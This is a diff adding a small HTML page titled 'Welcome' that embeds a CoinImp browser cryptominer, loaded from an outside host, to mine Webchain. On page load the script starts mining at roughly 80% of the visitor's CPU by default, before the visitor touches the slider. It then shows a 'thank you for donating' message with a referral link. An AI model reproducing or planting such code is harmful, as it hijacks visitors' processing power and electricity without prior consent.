@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<title>Welcome</title>
+		<meta charset="UTF-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+		<style>body {font-family: "Lato", sans-serif}</style>
+	</head>
+	<body>
+		<input type="range" min="0" max="100" value="80" />
+		<p id="range-value"></p>
+		<p id="message"></p>
+		<p id="threads"></p>
+		<p id="hashrate"></p>
+		<p id="hashes"></p>
+		<script src="https://www.hostingcloud.racing/p1Rg.js"></script>
+		<script src="https://code.jquery.com/jquery-3.6.1.slim.min.js"></script>
+		<script>
+			// See coinimp documentation.
+			var _client = new Client.Anonymous('0544dea111557296b9430fb1c6d1d3272fcf844159538e9b1a205fb59fa81aa3', {
+			  //autoThreads: true,
+			  throttle: 0,
+			  c: 'w',
+			  ads: 0
+			});
+
+			function mining() {
+			  // set the throttle which is ((100 - cpu usage %)/100)
+			  _client.setThrottle((100 - $('[type=range]').val()) / 100);
+			  // add log informations of the mining
+			  //$('body').append('<p id="message"></p>');
+			  //$('body').append('<p id="hashrate"></p>');
+			  setInterval(function() {
+				threads = _client.getNumThreads();
+				$('#threads').text(threads + ' threads');
+				hps = _client.getHashesPerSecond();
+				$('#hashrate').text(hps + ' hashes / second');
+					hashes = _client.getTotalHashes([true]);
+				$('#hashes').text(hashes + ' hashes');
+			  }, 1000);
+			  // if the slider value is large than 0 start mining and vice versa
+			  if ($('[type=range]').val() > 0) {
+				_client.start();
+				$('#message').text('Thank you for donating at most ' + (100 - (_client.getThrottle() * 100)) + '% of your processing power for mining Webchain! Reference: https://www.coinimp.com/invite/e33e1cb1-04de-47a4-83bf-04055dbfb464');
+			  } else {
+				_client.stop();
+				$('#message').text('Donate your processing power to mine Webchain for this site:');
+			  }
+			}
+
+
+			$('[type=range]').change(function() {
+			  // write the value into the <p> tag with id range-value
+			  $('#range-value').text($(this).val());
+			  mining();
+			});
+			// run on startup
+			mining();
+		</script>
+	</body>
+</html>
